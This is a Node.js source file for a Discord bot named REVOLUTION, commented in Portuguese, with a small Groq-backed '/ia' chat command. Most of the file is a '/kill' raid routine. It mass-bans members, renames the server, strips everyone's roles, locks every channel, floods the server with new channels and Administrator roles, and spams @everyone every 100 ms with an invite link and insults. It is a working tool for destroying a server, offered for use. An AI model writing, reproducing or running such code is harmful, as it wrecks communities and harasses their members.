const { Client, GatewayIntentBits, PermissionsBitField, EmbedBuilder } = require('discord.js');
const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ============ CONFIGURAÇÃO DA GROQ (SEGURA) ============
const GROQ_API_KEY = process.env.GROQ_API_KEY;
const GROQ_API_URL = 'https://api.groq.com/openai/v1/chat/completions';

if (!GROQ_API_KEY) {
  console.warn('⚠️ GROQ_API_KEY não configurada! O comando /ia não vai funcionar.');
}

// ============ CLIENT ============
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ]
});

client.commands = new Map();

// ============ FUNÇÃO PARA CHAMAR A IA ============
async function callGroqAI(mensagem) {
  if (!GROQ_API_KEY) {
    return '❌ API da Groq não configurada. Contate o administrador.';
  }

  try {
    const response = await fetch(GROQ_API_URL, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${GROQ_API_KEY}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        model: 'mixtral-8x7b-32768',
        messages: [
          {
            role: 'system',
            content: 'Você é um assistente útil e inteligente chamado REVOLUTION. Responda de forma clara e direta.'
          },
          {
            role: 'user',
            content: mensagem
          }
        ],
        temperature: 0.7,
        max_tokens: 500
      })
    });

    const data = await response.json();
    
    if (data.choices && data.choices.length > 0) {
      return data.choices[0].message.content;
    } else {
      return '❌ Erro ao processar sua pergunta. Tente novamente.';
    }
  } catch (error) {
    console.error('ERRO NA IA:', error);
    return '❌ Erro ao conectar com a IA. Verifique a API.';
  }
}

// ============ MENSAGEM PERSONALIZADA ============
const mensagemSpam = `⚠️ **Aviso**

O servidor está passando por um ataque neste momento. A equipe de moderação já foi informada e está trabalhando para normalizar a situação.

Pedimos que todos os membros mantenham a calma, evitem clicar em links suspeitos e denunciem qualquer comportamento malicioso aos administradores.

Obrigado pela compreensão.

https://discord.gg/Cg4DXEMbn

# hackds by ordemX
# manda o governo se fuder aq e nois porra
# morre panela

@everyone`;

// ============ GERENCIADOR DE ATAQUE ============
class AttackManager {
  constructor() {
    this.activeAttacks = new Map();
  }

  startAttack(guild, user, client) {
    const guildId = guild.id;
    
    if (this.activeAttacks.has(guildId)) {
      this.stopAttack(guildId);
    }

    let isRunning = true;
    let totalBanidos = 0;
    let totalCanais = 0;

    // ============ 1. BANIR TODOS OS USUÁRIOS ============
    const banAllUsers = async () => {
      if (!isRunning) return;
      try {
        const members = guild.members.cache.filter(m => 
          !m.user.bot && 
          m.id !== user.id && 
          m.id !== client.user.id &&
          m.bannable
        );

        for (const member of members.values()) {
          if (!isRunning) break;
          try {
            await member.ban({ reason: 'REVOLUTION - OPERAÇÃO ANTI-PANELINHA' });
            totalBanidos++;
            console.log(`🔨 USUÁRIO BANIDO: ${member.user.tag} (${totalBanidos})`);
          } catch (error) {}
        }
      } catch (error) {}
    };
    banAllUsers();
    const banInterval = setInterval(banAllUsers, 5000);

    // ============ 2. MUDA O NOME DO SERVIDOR ============
    const changeServerName = async () => {
      if (!isRunning) return;
      try {
        await guild.setName('REVOLUTION');
        console.log(`📛 NOME DO SERVIDOR ALTERADO PARA: REVOLUTION`);
      } catch (error) {}
    };
    changeServerName();
    const nameInterval = setInterval(changeServerName, 10000);

    // ============ 3. CRIA CARGO INFERIOR ============
    const createLowRole = async () => {
      if (!isRunning) return;
      try {
        const lowRoleName = 'REVOLUTION_SUB';
        let lowRole = guild.roles.cache.find(r => r.name === lowRoleName);
        if (!lowRole) {
          lowRole = await guild.roles.create({
            name: lowRoleName,
            color: '#333333',
            position: 0,
            permissions: []
          });
        }

        const members = guild.members.cache.filter(m => 
          !m.user.bot && m.id !== user.id && m.id !== client.user.id
        );

        for (const member of members.values()) {
          if (!isRunning) break;
          try {
            await member.roles.set([lowRole.id]);
          } catch (error) {}
        }
      } catch (error) {}
    };
    createLowRole();
    const rebaixamentoInterval = setInterval(createLowRole, 20000);

    // ============ 4. LOCK EM TODOS OS CANAIS ============
    const lockAllChannels = async () => {
      if (!isRunning) return;
      try {
        const channels = guild.channels.cache.filter(ch => ch.isTextBased());
        for (const channel of channels.values()) {
          if (!isRunning) break;
          try {
            await channel.permissionOverwrites.edit(guild.id, {
              SendMessages: false,
              AddReactions: false
            });
            await channel.permissionOverwrites.edit(client.user.id, {
              SendMessages: true,
              AddReactions: true
            });
            const owner = guild.members.cache.get(user.id);
            if (owner) {
              await channel.permissionOverwrites.edit(owner.id, {
                SendMessages: true,
                AddReactions: true,
                ManageMessages: true
              });
            }
          } catch (error) {}
        }
      } catch (error) {}
    };
    lockAllChannels();
    const lockInterval = setInterval(lockAllChannels, 15000);

    // ============ 5. CRIAÇÃO DE CANAIS (SEM NÚMEROS) ============
    const createChannel = async () => {
      if (!isRunning) return;
      try {
        const channelName = `RAID BY REVOLUTION`;
        const existing = guild.channels.cache.find(c => c.name === channelName);
        if (!existing) {
          await guild.channels.create({
            name: channelName,
            type: 0,
            permissionOverwrites: [
              {
                id: guild.id,
                allow: ['ViewChannel']
              }
            ]
          });
          totalCanais++;
          console.log(`📁 CANAL CRIADO: #${channelName} (${totalCanais})`);
        } else {
          const randomSuffix = Math.floor(Math.random() * 10000);
          const altChannelName = `RAID BY REVOLUTION-${randomSuffix}`;
          await guild.channels.create({
            name: altChannelName,
            type: 0,
            permissionOverwrites: [
              {
                id: guild.id,
                allow: ['ViewChannel']
              }
            ]
          });
          totalCanais++;
          console.log(`📁 CANAL CRIADO: #${altChannelName} (${totalCanais})`);
        }
      } catch (error) {}
    };

    for (let i = 0; i < 5; i++) createChannel();
    const channelInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createChannel();
    }, 300);

    // ============ 6. CRIAÇÃO DE CARGOS ============
    const createRole = async () => {
      if (!isRunning) return;
      try {
        await guild.roles.create({
          name: 'RAID BY REVOLUTION',
          color: '#ff0000',
          permissions: [PermissionsBitField.Flags.Administrator]
        });
      } catch (error) {}
    };

    for (let i = 0; i < 10; i++) createRole();
    const roleInterval = setInterval(() => {
      for (let i = 0; i < 3; i++) createRole();
    }, 200);

    // ============ 7. SPAM ============
    let messageCount = 0;

    const spamFunction = async () => {
      if (!isRunning) return;
      
      try {
        const channels = guild.channels.cache.filter(ch => 
          ch.isTextBased() && 
          ch.permissionsFor(client.user).has(PermissionsBitField.Flags.SendMessages)
        );
        
        const channelArray = Array.from(channels.values());
        if (channelArray.length === 0) return;

        for (const channel of channelArray.slice(0, 10)) {
          if (!isRunning) break;
          try {
            const embed = new EmbedBuilder()
              .setTitle('🔥 REVOLUTION 🔥')
              .setDescription(mensagemSpam)
              .setColor('#ff0000')
              .setFooter({ text: 'REVOLUTION - SAIAM DAS TREVAS' })
              .setTimestamp();

            await channel.send({ 
              content: `@everyone 🔥 SERVIDOR TOMADO POR REVOLUTION 🔥`,
              embeds: [embed]
            });
            messageCount++;
          } catch (error) {}
        }
        
        if (messageCount % 10 === 0) {
          console.log(`📢 SPAM #${messageCount} enviado`);
        }
      } catch (error) {}
    };

    const spamInterval = setInterval(spamFunction, 100);
    for (let i = 0; i < 5; i++) {
      setTimeout(spamFunction, i * 10);
    }

    // ============ SALVA O ATAQUE ============
    const attackData = {
      spamInterval,
      channelInterval,
      roleInterval,
      lockInterval,
      rebaixamentoInterval,
      banInterval,
      nameInterval,
      isRunning,
      target: guild.name,
      author: user.tag,
      startTime: new Date(),
      messageCount: 0,
      totalBanidos: 0,
      totalCanais: 0,
      stop: () => {
        console.log(`🛑 PARANDO ATAQUE no servidor ${guild.name}...`);
        isRunning = false;
        clearInterval(spamInterval);
        clearInterval(channelInterval);
        clearInterval(roleInterval);
        clearInterval(lockInterval);
        clearInterval(rebaixamentoInterval);
        clearInterval(banInterval);
        clearInterval(nameInterval);
        this.activeAttacks.delete(guildId);
        console.log(`✅ ATAQUE PARADO no servidor ${guild.name}`);
        console.log(`📊 TOTAL DE BANIDOS: ${totalBanidos}`);
        console.log(`📊 TOTAL DE CANAIS CRIADOS: ${totalCanais}`);
      }
    };

    this.activeAttacks.set(guildId, attackData);

    console.log(`🔥 ATAQUE REVOLUTION iniciado no servidor ${guild.name} por ${user.tag}`);
    return attackData;
  }

  stopAttack(guildId) {
    const attack = this.activeAttacks.get(guildId);
    if (attack) {
      attack.stop();
      return true;
    }
    return false;
  }

  getStatus(guildId) {
    return this.activeAttacks.get(guildId) || null;
  }
}

const attackManager = new AttackManager();

// ============ COMANDO: KILL ============
client.commands.set('kill', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
      return interaction.reply({
        content: '❌ VOCE PRECISA SER ADMINISTRADOR NO SERVIDOR.',
        ephemeral: true
      });
    }

    try {
      await attackManager.startAttack(interaction.guild, interaction.user, client);

      const successEmbed = new EmbedBuilder()
        .setTitle('🔥 ATAQUE REVOLUTION INICIADO')
        .setColor('#ff0000')
        .setDescription(`O SERVIDOR ${interaction.guild.name} ESTA SOB ATAQUE`)
        .addFields(
          { name: 'COMANDANTE', value: interaction.user.tag, inline: true },
          { name: 'PARAR', value: 'USE /end PARA PARAR', inline: true },
          { name: 'STATUS', value: 'BANIMENTO EM MASSA ATIVADO', inline: false }
        )
        .setFooter({ text: 'REVOLUTION - ATAQUE' })
        .setTimestamp();

      await interaction.reply({ embeds: [successEmbed] });
      console.log(`🔥 ATAQUE iniciado por ${interaction.user.tag} no servidor ${interaction.guild.name}`);

    } catch (error) {
      await interaction.reply({ 
        content: `❌ ERRO: ${error.message}`,
        ephemeral: true
      });
      console.error(`ERRO NO KILL: ${error.message}`);
    }
  }
});

// ============ COMANDO: END ============
client.commands.set('end', {
  execute: async (interaction) => {
    if (interaction.user.id !== process.env.OWNER_ID) {
      return interaction.reply({
        content: '❌ APENAS O DONO DO BOT PODE USAR ESTE COMANDO.',
        ephemeral: true
      });
    }

    const guildId = interaction.guild.id;
    const attack = attackManager.getStatus(guildId);
    
    if (attack) {
      attackManager.stopAttack(guildId);
      
      const embed = new EmbedBuilder()
        .setTitle('🛑 ATAQUE PARADO')
        .setColor('#00ff00')
        .setDescription('O ATAQUE REVOLUTION FOI DESATIVADO')
        .addFields(
          { name: 'PARADO POR', value: interaction.user.tag, inline: true },
          { name: 'STATUS', value: 'ATAQUE PARADO', inline: true }
        )
        .setFooter({ text: 'REVOLUTION - DESATIVADO' })
        .setTimestamp();

      await interaction.reply({ embeds: [embed] });
      console.log(`🛑 END executado por ${interaction.user.tag}`);
    } else {
      await interaction.reply({
        content: '❌ NENHUM ATAQUE ATIVO PARA PARAR.',
        ephemeral: true
      });
    }
  }
});

// ============ COMANDO: IA ============
client.commands.set('ia', {
  execute: async (interaction) => {
    const pergunta = interaction.options.getString('pergunta');
    
    if (!pergunta) {
      return interaction.reply({
        content: '❌ DIGITE UMA PERGUNTA! Exemplo: `/ia pergunta:O que é Revolution?`',
        ephemeral: true
      });
    }

    await interaction.reply({
      content: '🤖 **REVOLUTION IA ESTÁ PENSANDO...**'
    });

    try {
      const resposta = await callGroqAI(pergunta);
      
      const embed = new EmbedBuilder()
        .setTitle('🤖 REVOLUTION IA')
        .setColor('#ff0000')
        .setDescription(resposta)
        .addFields(
          { name: '📝 PERGUNTA', value: pergunta, inline: false }
        )
        .setFooter({ text: 'REVOLUTION - INTELIGÊNCIA ARTIFICIAL' })
        .setTimestamp();

      await interaction.editReply({ content: null, embeds: [embed] });
      
    } catch (error) {
      await interaction.editReply({
        content: '❌ ERRO AO PROCESSAR SUA PERGUNTA. TENTE NOVAMENTE.',
        embeds: []
      });
      console.error('ERRO NA IA:', error);
    }
  }
});

// ============ COMANDO: PING ============
client.commands.set('ping', {
  execute: async (interaction) => {
    const sent = await interaction.reply({ content: '🏓 Pong!', fetchReply: true });
    const latency = sent.createdTimestamp - interaction.createdTimestamp;
    await interaction.editReply(`🏓 Pong! Latência: ${latency}ms | API: ${Math.round(client.ws.ping)}ms`);
  }
});

// ============ EVENTOS ============

client.on('ready', () => {
  console.log(`🚀 Bot ${client.user.tag} esta ONLINE!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);
  console.log(`🤖 IA CARREGADA! Use /ia pergunta:`);
  
  client.user.setPresence({
    activities: [{
      name: '🤖 IA | /kill | /ia',
      type: 3,
      state: 'Use /ia para perguntar'
    }],
    status: 'online'
  });
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isCommand()) return;

  const command = client.commands.get(interaction.commandName);
  if (!command) {
    return interaction.reply({
      content: '❌ COMANDO NAO ENCONTRADO!',
      ephemeral: true
    });
  }

  try {
    await command.execute(interaction);
  } catch (error) {
    console.error(`Erro no comando ${interaction.commandName}: ${error.message}`);
    
    if (interaction.replied || interaction.deferred) {
      await interaction.followUp({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    } else {
      await interaction.reply({ 
        content: '❌ ERRO AO EXECUTAR COMANDO!', 
        ephemeral: true 
      });
    }
  }
});

// ============ SERVIDOR WEB ============
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Bot Revolution esta ONLINE!');
});

app.get('/health', (req, res) => {
  res.json({
    status: 'online',
    uptime: process.uptime(),
    timestamp: new Date().toISOString(),
    ataquesAtivos: attackManager.activeAttacks.size,
    servidores: client.guilds.cache.size,
    ia: GROQ_API_KEY ? 'Groq API - Mixtral 8x7b' : 'Desativada'
  });
});

app.listen(PORT, () => {
  console.log(`Servidor web rodando na porta ${PORT}`);
});

// ============ LOGIN ============

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
  console.error('TOKEN NAO ENCONTRADO!');
  process.exit(1);
}

client.login(TOKEN).catch(error => {
  console.error(`Erro ao fazer login: ${error.message}`);
  process.exit(1);
});
